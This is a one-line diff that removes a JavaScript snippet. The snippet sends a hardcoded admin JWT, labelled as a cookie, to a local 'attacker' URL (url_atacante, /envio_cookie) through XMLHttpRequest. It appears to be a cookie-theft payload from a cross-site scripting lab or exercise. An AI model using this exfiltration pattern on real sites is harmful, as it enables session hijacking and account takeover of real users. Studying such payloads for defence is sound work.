@@ -1,1 +1,0 @@
-var xhttp = new XMLHttpRequest(); cookie = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2NzM5Nzc1NDUsImV4cCI6MTY3Mzk4MTE0NX0.a_UOk6OPALaRyFWvmcetCXEXOPP1huP7ONAtaR5HEB4";  url_atacante = "http://127.0.0.1:8000/envio_cookie?cookie=" + cookie;  xhttp.open("GET", url_atacante, true); xhttp.send();
